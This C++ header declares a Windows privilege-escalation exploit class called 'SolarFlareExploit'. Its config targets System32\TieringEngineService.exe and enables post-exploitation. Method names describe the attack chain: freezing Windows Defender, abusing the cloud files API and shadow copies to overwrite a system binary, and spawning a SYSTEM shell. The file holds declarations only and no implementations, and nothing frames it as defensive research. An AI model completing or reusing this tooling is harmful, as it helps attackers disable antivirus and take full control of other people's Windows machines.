#pragma once

#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <cfapi.h>
#include <cldapi.h>
#include <string>
#include <vector>
#include <memory>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "CldApi.lib")
#pragma comment(lib, "synchronization.lib")
#pragma comment(lib, "rpcrt4.lib")

// NT Structures
typedef struct _FILE_DISPOSITION_INFORMATION_EX {
    ULONG Flags;
} FILE_DISPOSITION_INFORMATION_EX, *PFILE_DISPOSITION_INFORMATION_EX;

typedef struct _FILE_RENAME_INFORMATION {
    union {
        BOOLEAN ReplaceIfExists;
        ULONG Flags;
    } DUMMYUNIONNAME;
    HANDLE RootDirectory;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_RENAME_INFORMATION, *PFILE_RENAME_INFORMATION;

typedef struct _OBJECT_DIRECTORY_INFORMATION {
    UNICODE_STRING Name;
    UNICODE_STRING TypeName;
} OBJECT_DIRECTORY_INFORMATION, *POBJECT_DIRECTORY_INFORMATION;

typedef struct _REPARSE_DATA_BUFFER {
    ULONG ReparseTag;
    USHORT ReparseDataLength;
    USHORT Reserved;
    union {
        struct {
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            ULONG Flags;
            WCHAR PathBuffer[1];
        } SymbolicLinkReparseBuffer;
        struct {
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            WCHAR PathBuffer[1];
        } MountPointReparseBuffer;
        struct {
            UCHAR DataBuffer[1];
        } GenericReparseBuffer;
    } DUMMYUNIONNAME;
} REPARSE_DATA_BUFFER, *PREPARSE_DATA_BUFFER;

#define REPARSE_DATA_BUFFER_HEADER_LENGTH FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer)

// Volume Shadow Copy linked list
struct ShadowVolumeNode {
    std::wstring name;
    std::unique_ptr<ShadowVolumeNode> next;
};

// Combined exploit configuration
struct ExploitConfig {
    std::wstring targetFile = L"\\Windows\\System32\\TieringEngineService.exe";
    std::wstring providerName = L"SolarFlareExploit";
    DWORD timeoutMs = 120000;
    bool enablePostExploit = true;
};

// Main exploit class
class SolarFlareExploit {
private:
    HMODULE m_ntdll;
    ExploitConfig m_config;
    HANDLE m_globalEvent;
    HANDLE m_pipeHandle;
    std::wstring m_workDir;
    std::unique_ptr<ShadowVolumeNode> m_initialShadows;

    // NT function pointers
    NTSTATUS(WINAPI* NtOpenDirectoryObject)(
        PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
    NTSTATUS(WINAPI* NtQueryDirectoryObject)(
        HANDLE, PVOID, ULONG, BOOLEAN, BOOLEAN, PULONG, PULONG);
    NTSTATUS(WINAPI* NtSetInformationFile)(
        HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS);
    NTSTATUS(WINAPI* NtCreateFile)(
        PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK,
        PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);

    bool InitializeNtFunctions();
    std::unique_ptr<ShadowVolumeNode> GetCurrentShadowCopies();
    bool FindNewShadowCopy(const std::wstring& targetPath, std::wstring& outPath);
    bool FreezeDefender(const std::wstring& syncRoot);
    bool TriggerCloudRewrite(const std::wstring& workDir, const std::wstring& filename);
    bool OverwriteSystemFile(const std::wstring& sourcePath, const std::wstring& targetPath);
    void SpawnSystemShell(DWORD sessionId);
    bool IsRunningAsSystem();

public:
    SolarFlareExploit();
    ~SolarFlareExploit();
    bool Initialize();
    bool Run();
    void SetConfig(const ExploitConfig& config);
};

// Helper functions
std::wstring GetTempPath();
bool CreateGuidString(std::wstring& outGuid);
void ReverseString(char* str);